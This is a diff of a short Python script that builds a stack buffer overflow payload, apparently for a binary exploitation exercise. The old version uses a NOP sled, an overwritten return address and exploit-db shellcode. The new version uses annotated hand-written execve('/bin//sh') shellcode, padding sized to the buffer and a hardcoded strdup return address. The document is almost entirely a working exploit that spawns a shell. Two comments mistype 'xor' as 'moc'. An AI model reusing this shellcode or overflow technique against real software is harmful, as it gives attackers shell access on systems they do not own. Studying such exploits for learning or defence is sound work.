@@ -1,10 +1,23 @@
-import struct
+# Shellcode without '\n' or '\0' that executes 'execve("/bin//sh", NULL, NULL)'
+SHELLCODE = (
+    b"\x31\xc0"  # xor eax, eax
+    + b"\x50"  # push eax (null terminator)
+    + b"\x04\x0b"  # add al, 11 (execve)
+    + b"\x68//sh"  # push "//sh"
+    + b"\x68/bin"  # push "/bin"
+    + b"\x89\xe3"  # mov ebx, esp (ebx points to "/bin//sh")
+    + b"\x31\xc9"  # moc ecx, ecx (argv = NULL)
+    + b"\x31\xd2"  # moc edx, edx (envp = NULL)
+    + b"\xcd\x80"  # int 0x80 (syscall)
+)
 
-PAD = b"w" * 76
-EIP = struct.pack("I", 0xBFFFF740)
-NOP = b"\x90" * 100
+BUFFER_SIZE = 64
+INT_SIZE = 4
+ALIGNMENT_SIZE = 8
+EBP_SIZE = 4
+PADDING_SIZE = BUFFER_SIZE + INT_SIZE + ALIGNMENT_SIZE + EBP_SIZE - len(SHELLCODE)
+PADDING = PADDING_SIZE * b"A"
 
-# https://www.exploit-db.com/exploits/13357
-SHELLCODE = b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+STRDUP_ADDR = b"\x08\xa0\x04\x08"
 
-print(PAD + EIP + NOP + SHELLCODE)
+print(SHELLCODE + PADDING + STRDUP_ADDR)
